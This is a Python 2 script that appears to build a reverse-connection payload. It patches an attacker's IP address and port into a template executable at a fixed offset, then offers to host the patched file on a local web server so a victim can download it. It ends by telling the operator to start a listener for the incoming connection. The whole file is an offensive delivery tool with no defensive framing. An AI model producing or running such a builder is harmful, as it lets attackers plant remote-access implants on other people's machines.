#!/usr/bin/env python2

import sys, shutil, errno, os, BaseHTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler

lhost_bytes = []
lhost = sys.argv[1]
lhost_bytes = [chr(int(part)) for part in lhost.split(".")]
port = int(sys.argv[2])
output = sys.argv[3]

try:
    os.makedirs('./payload/')
except OSError as exc:
    if exc.errno == errno.EEXIST and os.path.isdir('./payload/'):
        pass
    else:
        raise

shutil.copy2('./template/template.exe', './payload/'+output)

print "Encoding " + output + " " + lhost + ":" + str(port)
lport_bytes = [chr(int(hex(port)[2:4], 16)), chr(int(hex(port)[4:6].ljust(2,"0"), 16))]
with open('./payload/'+output,"r+b") as f:
	f.seek(972, 0)
	for part in lhost_bytes:
		f.write(part)
	for part in lport_bytes:
		f.write(part)

print "Payload generated, would you like to start a webserver there?"
print "y/N"
ans = raw_input()

if ans == "y":
    os.chdir('./payload/')
    HandlerClass = SimpleHTTPRequestHandler
    ServerClass  = BaseHTTPServer.HTTPServer
    HandlerClass.protocol_version = "HTTP/1.0"
    httpd = ServerClass((lhost, 8000), HandlerClass)
    
    sa = httpd.socket.getsockname()
    print "Get your executable at:"
    print "http://" + sa[0] + ":" + str(sa[1]) + "/" + output

    httpd.serve_forever()

    print "Make sure your handler is running...."
